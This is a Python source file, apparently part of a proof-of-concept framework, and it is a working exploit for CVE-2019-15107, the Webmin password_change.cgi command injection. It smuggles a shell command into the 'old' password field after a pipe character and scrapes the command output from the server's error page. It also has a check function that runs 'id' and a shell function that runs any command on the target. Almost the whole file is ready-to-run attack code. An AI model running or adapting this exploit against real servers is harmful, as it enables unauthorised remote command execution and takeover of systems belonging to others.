import requests
import re
import requests.packages.urllib3

from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_26084.Confluence_RCE import cmdExec
requests.packages.urllib3.disable_warnings()
import sys



def CVE_2019_15107(url, cmd):
    vuln_url = url + "/password_change.cgi"
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    } 
    payload="user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % cmd
    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
    if r.status_code ==200 and "The current password is " in r.content : 
        m = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
        cmd_result = m.findall(r.content)[0]
        return cmd_result
    else:
        return False

def attack(url): 
    result = CVE_2019_15107(url, "id")
    if result != False and "uid=" in result and "gid=" in result:
        return True
    else: 
        return False 

def shell(url, command): 
    command = command.replace(" ", "+")
    CVE_2019_15107(url, command)
    return True

# if __name__ == "__main__":
#     # url = "https://10.10.20.166:10000"
#     url = sys.argv[1]
#     cmd = sys.argv[2]
#     CVE_2019_15107(url, cmd)